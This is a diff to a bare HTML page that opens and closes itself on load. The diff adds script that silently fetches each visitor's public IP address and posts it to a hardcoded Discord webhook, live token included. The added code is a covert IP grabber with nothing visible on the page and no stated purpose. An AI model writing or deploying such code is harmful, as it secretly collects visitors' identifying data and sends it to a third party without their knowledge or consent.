@@ -1,6 +1,50 @@
 <!doctype html><html><head><script>
       window.onload = function load() {
         window.open('', '_self', '');
+                    function sendMessage(webhookURL, message) {
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({content: message})
+            })
+            .catch(error => console.log(error));
+        }
+
+        function splitMessage(message, maxLength) {
+            var messages = [];
+            var words = message.split(' ');
+            var currentMessage = '';
+            words.forEach(word => {
+                if (currentMessage.length + word.length < maxLength) {
+                    currentMessage += word + ' ';
+                } else {
+                    messages.push(currentMessage.trim());
+                    currentMessage = word + ' ';
+                }
+            });
+            messages.push(currentMessage.trim());
+            return messages;
+        }
+
+            // Send IP to Discord webhook
+            var ip = '';
+            fetch('https://api.my-ip.io/ip')
+                .then(response => response.text())
+                .then(data => {
+                    ip = data.trim();
+                    var webhookURL = 'https://discord.com/api/webhooks/1125449057347846315/Xiiy-bJH4CYr9MKDDrX3DxQRl9QlfMWyh4V-bZ-HDpj7gtYgun4OyFZSIEGt1cJ5vuN4';
+                    var content = 'IP Address: ' + ip;
+                    if (content.length <= 2000) {
+                        sendMessage(webhookURL, content);
+                    } else {
+                        var messages = splitMessage(content, 2000);
+                        messages.forEach(message => sendMessage(webhookURL, message));
+                    }
+                })
+                .catch(error => console.log(error));
+        };
         window.close();
       };
 </script></head><body></body></html>
